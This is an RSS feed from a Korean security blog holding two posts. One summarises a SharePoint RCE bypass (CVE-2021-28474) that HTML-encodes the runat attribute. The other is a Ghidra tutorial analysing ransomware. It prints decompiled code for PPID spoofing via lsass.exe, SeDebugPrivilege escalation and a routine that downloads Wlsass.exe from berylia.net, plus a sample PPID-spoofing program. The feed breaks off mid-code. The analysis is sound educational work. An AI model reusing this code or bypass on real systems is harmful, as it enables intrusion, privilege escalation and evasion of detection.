<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Mon, 12 Jul 2021 03:51:49 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[하루한줄] CVE-2021-28474: SharePoint Interpretation conflict RCE</title>
      <link>https://hackyboiz.github.io/2021/07/12/fabu1ous/2021-07-12/</link>
      <guid>https://hackyboiz.github.io/2021/07/12/fabu1ous/2021-07-12/</guid>
      <pubDate>Mon, 12 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/7/7/cve-2021-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/7/7/cve-2021-28474-sharepoint-remote-code-execution-via-server-side-control-interpretation-conflict">CVE-2021-28474: SHAREPOINT REMOTE CODE EXECUTION VIA SERVER-SIDE CONTROL INTERPRETATION CONFLICT</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Microsoft SharePoint Server</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Microsoft SharPoint Server에서 발생하는 원격 코드 실행 취약점이 패치되어 write-up이 공개되었습니다. 보안 확인에 사용되는 코드와 실제로 사용자 입력을 처리하는 코드 간의 불일치로 발생하는 취약점입니다. 인증된 SharePoint 사용자는 해당 취약점을 악용해 임의의 .NET 코드를 실행 할 수 있습니다.</p><p><code>EditingPageParser.VerifyControlOnSafeList()</code> 함수는 server-side control(<code>runat=&quot;server&quot;</code> attribute가 있는 tag)에 해당하는 input을 파싱해 해쉬 테이블을 만들고 그 값들을 <code>web.config</code> 파일과 비교하여 안전한 control 인지 확인합니다.</p><p>문제는 control을 처리할 땐 파서가 attribute를 HTML-decode 하지만, verification 작업에선 HTML-decode를 하지 않습니다. 따라서 <code>runat=&quot;&amp;#115;erver&quot;</code>와 같은 ASPX tag attribute를 사용하면 verification 시 server-side control로 인식되지 않아 bypass 할 수 있습니다. </p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/conflict/">conflict</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/12/fabu1ous/2021-07-12/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Re:versing으로 시작하는 ghidra 생활 Part 5 - Malware Analysis (2)</title>
      <link>https://hackyboiz.github.io/2021/07/11/idioth/ghidra_part5/</link>
      <guid>https://hackyboiz.github.io/2021/07/11/idioth/ghidra_part5/</guid>
      <pubDate>Sun, 11 Jul 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;strong&gt;다른 파트 보러가기&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/&quot;&gt;Re:versing으로 시작하는 ghidra 생활 Part</description>
        
      
      
      
      <content:encoded><![CDATA[<p><strong>다른 파트 보러가기</strong></p><p><a href="https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/">Re:versing으로 시작하는 ghidra 생활 Part 1 - Overview</a></p><p><a href="https://hackyboiz.github.io/2021/03/07/idioth/ghidra_part2/">Re:versing으로 시작하는 ghidra 생활 Part 2 - Data, Functions, Scripts</a></p><p><a href="https://hackyboiz.github.io/2021/04/04/idioth/ghidra_part3/">Re:versing으로 시작하는 ghidra 생활 Part 3 - tips for IDA User (Here!)</a></p><p><a href="https://hackyboiz.github.io/2021/05/19/idioth/ghidra_part4/">Re:versing으로 시작하는 ghidra 생활 Part 4 - Malware Analysis (1)</a></p><p>Re:versing으로 시작하는 ghidra 생활 Part 5 - Malware Analysis (2) (Here!)</p><hr><p>안녕하세요. idioth입니다. 여러모로 일정이 딜레이가 되어서 이번 파트를 작성하는데 꽤 오랜 시간이 걸렸네요. 이번 게시글에서는 ataware 랜섬웨어의 ATAPIConfiguration 부분에 대해 분석할 예정이에요. 세 개의 바이너리 (ATAPIinit, ATAPIConfiguration, ATAPIUpdtr)를 분석한다고 하였지만, 사용하는 기능 자체가 크게 다르지 않고 악성코드 분석에 치중되는 것 같아 이번 파트를 마지막으로 ghidra 시리즈는 완료될 예정입니다.</p><h1 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h1><p>저번 게시글에서 ATAPIinit 바이너리가 <code>dropboxusercontent</code> 링크에 접속하여 ATAPIConfiguration을 다운로드하는 것을 확인했습니다. 해당 링크는 현재 비활성화되어 있으므로 바이너리는 <a href="https://www.notion.so/3a72818cfd7e4c05aa3ca52a894ae0d6">app.any.run</a>에서 구할 수 있습니다.</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled.png"></p><p>Detect It Easy로 확인한 결과 저번과 동일하게 mingw gcc로 컴파일이 된 파일임을 알 수 있습니다.</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%201.png"></p><p>이번에는 저번과 달리 크게 눈에 띄는 문자열은 없지만, <code>wininet.dll</code>, <code>berylia.net</code>, <code>Wlsass.exe</code> 문자열을 보고 유추해볼 때, 해당 링크에 network 접속을 하여 <code>Wlsass.exe</code> 파일을 다운로드하는 것으로 추정할 수 있겠네요.</p><h1 id="Ghidra를-통한-기초-정적-분석"><a href="#Ghidra를-통한-기초-정적-분석" class="headerlink" title="Ghidra를 통한 기초 정적 분석"></a>Ghidra를 통한 기초 정적 분석</h1><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%202.png"></p><p>벌써 마지막 파트까지 도달했으니 이제 바이너리 정도는 가뿐하게 열고 analyze를 하실 수 있겠죠? ATAPIConfiguration을 추가해준 후 analyze까지 해줍니다.</p><pre><code class="hljs cpp"><span class="hljs-function">undefined4 <span class="hljs-title">FUN_00401cb7</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">bool</span> bVar1;  HMODULE pHVar2;  <span class="hljs-keyword">int</span> iVar3;  undefined3 extraout_var;  undefined4 uVar4;  HANDLE hHeap;  undefined4 local_2c4 [<span class="hljs-number">2</span>];  undefined4 local_2bc;  <span class="hljs-keyword">wchar_t</span> awStack672 [<span class="hljs-number">260</span>];  SIZE_T local_98;  undefined local_94 [<span class="hljs-number">16</span>];  undefined4 local_84 [<span class="hljs-number">17</span>];  LPVOID local_40;  <span class="hljs-keyword">int</span> local_3c [<span class="hljs-number">2</span>];  FARPROC local_34;  FARPROC local_30;  FARPROC local_2c;  FARPROC local_28;  DWORD local_24;  FARPROC local_20;  FARPROC local_1c;  <span class="hljs-keyword">int</span> local_18;  FARPROC local_14;  undefined4 local_10;    local_3c[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;  pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);  local_14 = GetProcAddress(pHVar2,<span class="hljs-string">&quot;CreateToolhelp32Snapshot&quot;</span>);  local_18 = (*local_14)(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);  local_2c4[<span class="hljs-number">0</span>] = <span class="hljs-number">0x22c</span>;  pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);  local_1c = GetProcAddress(pHVar2,<span class="hljs-string">&quot;Process32FirstW&quot;</span>);  pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);  local_20 = GetProcAddress(pHVar2,<span class="hljs-string">&quot;Process32NextW&quot;</span>);  iVar3 = (*local_1c)(local_18,local_2c4);  <span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) &#123;    local_24 = GetLastError();  &#125;  <span class="hljs-keyword">do</span> &#123;    iVar3 = wcscmp(awStack672,<span class="hljs-string">L&quot;lsass.exe&quot;</span>);    <span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) &#123;      local_10 = local_2bc;    &#125;    iVar3 = (*local_20)(local_18,local_2c4);  &#125; <span class="hljs-keyword">while</span> (iVar3 != <span class="hljs-number">0</span>);  bVar1 = FUN_00401b91();  <span class="hljs-keyword">if</span> (CONCAT31(extraout_var,bVar1) == <span class="hljs-number">0</span>) &#123;    uVar4 = <span class="hljs-number">0</span>;  &#125;  <span class="hljs-keyword">else</span> &#123;    pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);    local_28 = GetProcAddress(pHVar2,<span class="hljs-string">&quot;OpenProcess&quot;</span>);    local_3c[<span class="hljs-number">0</span>] = (*local_28)(<span class="hljs-number">0x1f0fff</span>,<span class="hljs-number">0</span>,local_10);    <span class="hljs-keyword">if</span> (local_3c[<span class="hljs-number">0</span>] == <span class="hljs-number">0</span>) &#123;      uVar4 = <span class="hljs-number">0</span>;    &#125;    <span class="hljs-keyword">else</span> &#123;      <span class="hljs-built_in">memset</span>(local_84,<span class="hljs-number">0</span>,<span class="hljs-number">0x48</span>);      pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);      local_2c = GetProcAddress(pHVar2,<span class="hljs-string">&quot;InitializeProcThreadAttributeList&quot;</span>);      pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);      local_30 = GetProcAddress(pHVar2,<span class="hljs-string">&quot;UpdateProcThreadAttribute&quot;</span>);      (*local_2c)(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,&amp;local_98);      hHeap = GetProcessHeap();      local_40 = HeapAlloc(hHeap,<span class="hljs-number">0</span>,local_98);      (*local_2c)(local_40,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,&amp;local_98);      (*local_30)(local_40,<span class="hljs-number">0</span>,<span class="hljs-number">0x20000</span>,local_3c,<span class="hljs-number">4</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);      local_84[<span class="hljs-number">0</span>] = <span class="hljs-number">0x48</span>;      pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);      local_34 = GetProcAddress(pHVar2,<span class="hljs-string">&quot;CreateProcessA&quot;</span>);      FUN_00401570();      iVar3 = (*local_34)(DAT_00416028,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x80010</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,local_84,local_94);      <span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) &#123;        uVar4 = <span class="hljs-number">0</span>;      &#125;      <span class="hljs-keyword">else</span> &#123;        uVar4 = <span class="hljs-number">1</span>;      &#125;    &#125;  &#125;  <span class="hljs-keyword">return</span> uVar4;&#125;</code></pre><p>이번 바이너리에서 중점적으로 분석할 부분은 <code>FUN_00401cb7</code>입니다. 역시… 처음 열었을 때는 보기가 상당히 불편하네요. 이 변수가 어떤 건지도 모르겠고~ 저번 시간과 같이 보기 편하게 정리해봅시다.</p><pre><code class="hljs cpp"><span class="hljs-function">undefined4 <span class="hljs-title">FUN_00401cb7</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">bool</span> bVar1;  HMODULE hModule;  WINBOOL WVar2;  <span class="hljs-keyword">int</span> iVar3;  undefined3 extraout_var;  undefined4 uVar4;  HANDLE hHeap;  PROCESSENTRY32W lppe;  SIZE_T local_98;  _PROCESS_INFORMATION local_94;  _STARTUPINFOA local_84;  LPPROC_THREAD_ATTRIBUTE_LIST local_40;  HANDLE proc_handle [<span class="hljs-number">2</span>];  CreateProcessA *CreateProcessA_addr;  UpdateProcThreadAttribute *UpdateProcThreadAttribute_addr;  InitializeProcThreadAttributeList *InitializeProcThreadAttributeList_addr;  OpenProcess *OpenProcess_addr;  DWORD local_24;  Process32NextW *Process32NextW_addr;  Process32FirstW *Process32FirstW_addr;  HANDLE hSnapshot;  CreateToolhelp32Snapshot *CreateToolhelp32Snapshot_addr;  DWORD pid;    proc_handle[<span class="hljs-number">0</span>] = (HANDLE)<span class="hljs-number">0x0</span>;  hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);  CreateToolhelp32Snapshot_addr =       (CreateToolhelp32Snapshot *)GetProcAddress(hModule,<span class="hljs-string">&quot;CreateToolhelp32Snapshot&quot;</span>);  hSnapshot = (*CreateToolhelp32Snapshot_addr)(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);  lppe.dwSize = <span class="hljs-number">0x22c</span>;  hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);  Process32FirstW_addr = (Process32FirstW *)GetProcAddress(hModule,<span class="hljs-string">&quot;Process32FirstW&quot;</span>);  hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);  Process32NextW_addr = (Process32NextW *)GetProcAddress(hModule,<span class="hljs-string">&quot;Process32NextW&quot;</span>);  WVar2 = (*Process32FirstW_addr)(hSnapshot,(LPPROCESSENTRY32W)&amp;lppe);  <span class="hljs-keyword">if</span> (WVar2 == <span class="hljs-number">0</span>) &#123;    local_24 = GetLastError();  &#125;  <span class="hljs-keyword">do</span> &#123;    iVar3 = wcscmp(lppe.szExeFile,<span class="hljs-string">L&quot;lsass.exe&quot;</span>);    <span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) &#123;      pid = lppe.th32ProcessID;    &#125;    WVar2 = (*Process32NextW_addr)(hSnapshot,(LPPROCESSENTRY32W)&amp;lppe);  &#125; <span class="hljs-keyword">while</span> (WVar2 != <span class="hljs-number">0</span>);  bVar1 = FUN_00401b91();  <span class="hljs-keyword">if</span> (CONCAT31(extraout_var,bVar1) == <span class="hljs-number">0</span>) &#123;    uVar4 = <span class="hljs-number">0</span>;  &#125;  <span class="hljs-keyword">else</span> &#123;    hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);    OpenProcess_addr = (OpenProcess *)GetProcAddress(hModule,<span class="hljs-string">&quot;OpenProcess&quot;</span>);    proc_handle[<span class="hljs-number">0</span>] = (*OpenProcess_addr)(<span class="hljs-number">0x1f0fff</span>,<span class="hljs-number">0</span>,pid);    <span class="hljs-keyword">if</span> (proc_handle[<span class="hljs-number">0</span>] == (HANDLE)<span class="hljs-number">0x0</span>) &#123;      uVar4 = <span class="hljs-number">0</span>;    &#125;    <span class="hljs-keyword">else</span> &#123;      <span class="hljs-built_in">memset</span>(&amp;local_84,<span class="hljs-number">0</span>,<span class="hljs-number">0x48</span>);      hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);      InitializeProcThreadAttributeList_addr =           (InitializeProcThreadAttributeList *)           GetProcAddress(hModule,<span class="hljs-string">&quot;InitializeProcThreadAttributeList&quot;</span>);      hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);      UpdateProcThreadAttribute_addr =           (UpdateProcThreadAttribute *)GetProcAddress(hModule,<span class="hljs-string">&quot;UpdateProcThreadAttribute&quot;</span>);      (*InitializeProcThreadAttributeList_addr)((LPPROC_THREAD_ATTRIBUTE_LIST)<span class="hljs-number">0x0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,&amp;local_98);      hHeap = GetProcessHeap();      local_40 = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(hHeap,<span class="hljs-number">0</span>,local_98);      (*InitializeProcThreadAttributeList_addr)(local_40,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,&amp;local_98);      (*UpdateProcThreadAttribute_addr)(local_40,<span class="hljs-number">0</span>,<span class="hljs-number">0x20000</span>,proc_handle,<span class="hljs-number">4</span>,(PVOID)<span class="hljs-number">0x0</span>,(PSIZE_T)<span class="hljs-number">0x0</span>);      local_84.cb = <span class="hljs-number">0x48</span>;      hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);      CreateProcessA_addr = (CreateProcessA *)GetProcAddress(hModule,<span class="hljs-string">&quot;CreateProcessA&quot;</span>);      FUN_00401570();      WVar2 = (*CreateProcessA_addr)                        (DAT_00416028,(LPSTR)<span class="hljs-number">0x0</span>,(LPSECURITY_ATTRIBUTES)<span class="hljs-number">0x0</span>,                         (LPSECURITY_ATTRIBUTES)<span class="hljs-number">0x0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x80010</span>,(LPVOID)<span class="hljs-number">0x0</span>,(LPCSTR)<span class="hljs-number">0x0</span>,                         (LPSTARTUPINFOA)&amp;local_84,(LPPROCESS_INFORMATION)&amp;local_94);      <span class="hljs-keyword">if</span> (WVar2 == <span class="hljs-number">0</span>) &#123;        uVar4 = <span class="hljs-number">0</span>;      &#125;      <span class="hljs-keyword">else</span> &#123;        uVar4 = <span class="hljs-number">1</span>;      &#125;    &#125;  &#125;  <span class="hljs-keyword">return</span> uVar4;&#125;</code></pre><p>보기가 좀 편해진 거 같은 느낌이 듭니다. 전체적인 부분을 훑어봤을 때 프로세스를 탐색을 하며 <code>lsass.exe</code>와 비교하고 같을 시 해당 프로세스의 ID를 가져옵니다. 그 후 <code>FUN_00401b91</code>을 호출하네요. 그 후 가져온 <code>lsass.exe</code>의 프로세스 핸들을 열고 <code>IntitializeProcThreaddAttributeList</code>, <code>UpdateProcThreadAttribute</code> 등을 호출하는 걸 보아… <a href="https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing">PPID Spoofing</a>을 진행하는 거 같습니다. 해당 링크에서 확인할 수 있는 <code>ppid-spoofing.cpp</code> 코드와 비교해볼까요?</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;TlHelp32.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span><span class="hljs-function"></span>&#123;STARTUPINFOEXA si;PROCESS_INFORMATION pi;SIZE_T attributeSize;ZeroMemory(&amp;si, <span class="hljs-keyword">sizeof</span>(STARTUPINFOEXA));HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, <span class="hljs-literal">false</span>, <span class="hljs-number">6200</span>);InitializeProcThreadAttributeList(<span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, &amp;attributeSize);si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), <span class="hljs-number">0</span>, attributeSize);InitializeProcThreadAttributeList(si.lpAttributeList, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, &amp;attributeSize);UpdateProcThreadAttribute(si.lpAttributeList, <span class="hljs-number">0</span>, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;parentProcessHandle, <span class="hljs-keyword">sizeof</span>(HANDLE), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);si.StartupInfo.cb = <span class="hljs-keyword">sizeof</span>(STARTUPINFOEXA);CreateProcessA(<span class="hljs-literal">NULL</span>, (LPSTR)<span class="hljs-string">&quot;notepad&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE, EXTENDED_STARTUPINFO_PRESENT, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si.StartupInfo, &amp;pi);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>사용하는 함수, 파라미터가 동일한 것을 확인하실 수 있어요. 그럼 이 행위를 왜 하느냐?</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%203.png"></p><p>당연히 탐지를 피하기 위해서! PPID Spoofing을 하면 해당 프로세스가 <code>lsass.exe</code>에 의해서 생성된 것으로 보이도록 하므로 탐지를 피할 수 있습니다. (물론 탐지 방법도 존재하지만요.)</p><pre><code class="hljs cpp">CreateProcessA_addr = (CreateProcessA *)GetProcAddress(hModule,<span class="hljs-string">&quot;CreateProcessA&quot;</span>);      FUN_00401570();      WVar2 = (*CreateProcessA_addr)                        (DAT_00416028,(LPSTR)<span class="hljs-number">0x0</span>,(LPSECURITY_ATTRIBUTES)<span class="hljs-number">0x0</span>,                         (LPSECURITY_ATTRIBUTES)<span class="hljs-number">0x0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x80010</span>,(LPVOID)<span class="hljs-number">0x0</span>,(LPCSTR)<span class="hljs-number">0x0</span>,                         (LPSTARTUPINFOA)&amp;local_84,(LPPROCESS_INFORMATION)&amp;local_94);</code></pre><p>PPID Spoofing을 진행한 후, 밑에 코드를 확인하면 <code>FUN_00401570</code>을 호출한 후 <code>CreateProcess</code>를 통해 프로세스를 실행하는 것을 볼 수 있습니다.</p><p>정리하자면 해당 함수는 <code>lsass.exe</code>의 PID를 가져오고 <code>FUN_00401b91</code>을 호출한 후 PPID Spoofing을 진행한 뒤 <code>FUN_00401570</code>을 호출합니다. 그 후 <code>CreateProcessA</code>를 통해 추가적인 프로세스를 실행하네요.</p><p>근데 아까 위에서 확인했던 주소와 <code>Wlsass.exe</code>가 아직 나타나지 않았습니다. 음… 다운로드 기능이 추가되어있을 것 같은데? <code>FUN_00401b91</code>을 먼저 확인하면서 어떠한 행위를 하는지 확인해보죠!</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">token_priv_escalate</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  HANDLE thread_handle;  WINBOOL WVar1;  DWORD DVar2;  <span class="hljs-keyword">int</span> iVar3;  HANDLE token_handle;  ImpersonateSelf *ImpersonateSelf_addr;  OpenThreadToken *OpenThreadToken_addr;    OpenThreadToken_addr = (OpenThreadToken *)GetProcAddress(DAT_0041601c,<span class="hljs-string">&quot;OpenThreadToken&quot;</span>);  thread_handle = GetCurrentThread();  WVar1 = (*OpenThreadToken_addr)(thread_handle,<span class="hljs-number">0x28</span>,<span class="hljs-number">0</span>,&amp;token_handle);  <span class="hljs-keyword">if</span> (WVar1 == <span class="hljs-number">0</span>) &#123;    DVar2 = GetLastError();    <span class="hljs-keyword">if</span> (DVar2 != <span class="hljs-number">0x3f0</span>) &#123;      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;    ImpersonateSelf_addr = (ImpersonateSelf *)GetProcAddress(DAT_0041601c,<span class="hljs-string">&quot;ImpersonateSelf&quot;</span>);    WVar1 = (*ImpersonateSelf_addr)(SecurityImpersonation);    <span class="hljs-keyword">if</span> (WVar1 == <span class="hljs-number">0</span>) &#123;      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;    thread_handle = GetCurrentThread();    WVar1 = (*OpenThreadToken_addr)(thread_handle,<span class="hljs-number">0x28</span>,<span class="hljs-number">0</span>,&amp;token_handle);    <span class="hljs-keyword">if</span> (WVar1 == <span class="hljs-number">0</span>) &#123;      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;  &#125;  iVar3 = FUN_00401a9e(token_handle,<span class="hljs-string">L&quot;SeDebugPrivilege&quot;</span>);  <span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) &#123;    CloseHandle(token_handle);  &#125;  <span class="hljs-keyword">return</span> iVar3 != <span class="hljs-number">0</span>;&#125;</code></pre><p>스레드 토큰을 가져오고, Impersonation을 하고… 가장 결정적으로 <code>SeDebugPrivilege</code>를 호출합니다. Privilege 단어만 봐도 짐작이 되는군요. 흠흠… 해당 Token Privilege Escalation 인 것 같습니다! SeDebugPrivilege escalation 등으로 구글링을 해보면</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%204.png"></p><p><a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens</a></p><p>토큰을 통해 권한 상승을 하는 방법에 대해서 나와 있습니다. 밑으로 내려보면?</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%205.png"></p><p><code>SeDebugPrivilege</code>가 존재합니다.</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%206.png"></p><p><code>FUN_00401a9e</code>를 확인해보면 <code>AdjustTokenPrivileges</code>를 통해 액세스 토큰에 대한 권한을 설정하는 걸 확인할 수 있습니다. 그러면 <code>FUN_00401b91</code> 부분은 Token Privilege escalation을 하는 부분이네요. 그럼 다음 분석해야 할 부분인 <code>FUN_00401570</code>을 확인해볼까요?</p><pre><code class="hljs cpp"><span class="hljs-function">undefined4 <span class="hljs-title">FUN_00401570</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">char</span> cVar1;  <span class="hljs-keyword">bool</span> bVar2;  undefined4 uVar3;  HMODULE hModule;  WINBOOL WVar4;  <span class="hljs-keyword">size_t</span> temp_path_len;  undefined4 *puVar5;  uint uVar6;  <span class="hljs-keyword">char</span> *pcVar7;  DWORD local_60;  DWORD local_5c;  DWORD local_58;  uint local_54;  InternetCloseHandle *InternetCloseHandle_addr;  WriteFile *WriteFile_addr;  InternetReadFile *InternetReadFile_addr;  HANDLE local_44;  CreateFileW *CreateFileW_addr;  <span class="hljs-keyword">char</span> *temp_path;  <span class="hljs-keyword">void</span> *local_38;  WINBOOL local_34;  HttpSendRequestA *HttpSendRequestA_addr;  InternetSetOptionW *InternetSetOptionW_addr;  InternetQueryOptionW *InternetQueryOptionW_addr;  HINTERNET local_24;  HttpOpenRequestW *HttpOpenRequestW_addr;  HINTERNET local_1c;  InternetConnectW *InternetConnectW_addr;  HINTERNET local_14;  InternetOpenW *InternetOpenW_addr;    InternetOpenW_addr = (InternetOpenW *)GetProcAddress(DAT_00416020,<span class="hljs-string">&quot;InternetOpenW&quot;</span>);  local_14 = (*InternetOpenW_addr)(<span class="hljs-string">L&quot;WINDOWS&quot;</span>,<span class="hljs-number">0</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,<span class="hljs-number">0</span>);  <span class="hljs-keyword">if</span> (local_14 == (HINTERNET)<span class="hljs-number">0x0</span>) &#123;    uVar3 = <span class="hljs-number">0xe</span>;  &#125;  <span class="hljs-keyword">else</span> &#123;    hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);    InternetConnectW_addr = (InternetConnectW *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetConnectW&quot;</span>);    local_1c = (*InternetConnectW_addr)                         (local_14,<span class="hljs-string">L&quot;berylia.net&quot;</span>,<span class="hljs-number">0x1bb</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span> (local_1c == (HINTERNET)<span class="hljs-number">0x0</span>) &#123;      uVar3 = <span class="hljs-number">0xe</span>;    &#125;    <span class="hljs-keyword">else</span> &#123;      hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);      HttpOpenRequestW_addr = (HttpOpenRequestW *)GetProcAddress(hModule,<span class="hljs-string">&quot;HttpOpenRequestW&quot;</span>);      local_24 = (*HttpOpenRequestW_addr)                           (local_1c,<span class="hljs-string">L&quot;GET&quot;</span>,<span class="hljs-string">L&quot;/index/&quot;</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR *)<span class="hljs-number">0x0</span>,                            <span class="hljs-number">0x800000</span>,<span class="hljs-number">1</span>);      <span class="hljs-keyword">if</span> (local_24 == (HINTERNET)<span class="hljs-number">0x0</span>) &#123;        uVar3 = <span class="hljs-number">0xe</span>;      &#125;      <span class="hljs-keyword">else</span> &#123;        local_58 = <span class="hljs-number">4</span>;        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        InternetQueryOptionW_addr =             (InternetQueryOptionW *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetQueryOptionW&quot;</span>);        WVar4 = (*InternetQueryOptionW_addr)(local_24,<span class="hljs-number">0x1f</span>,&amp;local_54,&amp;local_58);        <span class="hljs-keyword">if</span> (WVar4 != <span class="hljs-number">0</span>) &#123;          hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);          InternetSetOptionW_addr =               (InternetSetOptionW 